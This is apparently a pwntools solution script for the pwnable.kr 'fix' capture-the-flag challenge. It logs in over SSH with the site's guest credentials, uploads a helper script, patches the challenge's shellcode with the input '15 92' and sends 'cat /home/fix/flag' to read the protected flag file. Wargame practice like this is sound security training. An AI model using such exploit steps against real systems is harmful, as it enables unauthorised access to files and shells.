from pwn import *

pwnfile = r"""
from pwn import *

sh = process("/home/fix/fix")
sh.sendline("15 92")
sh.sendline("cat /home/fix/flag")
print sh.recvline()
"""

con = ssh("fix", "pwnable.kr", 2222, "guest")
con.shell("mkdir /tmp/leo5")
con.upload_data(pwnfile, "/tmp/leo5/pwnfile.py")
sh = con.shell("ulimit -s unlimited && python -i /tmp/leo5/pwnfile.py")
print(sh.recvuntil(">>>"))

# What the hell is wrong with my shellcode??????
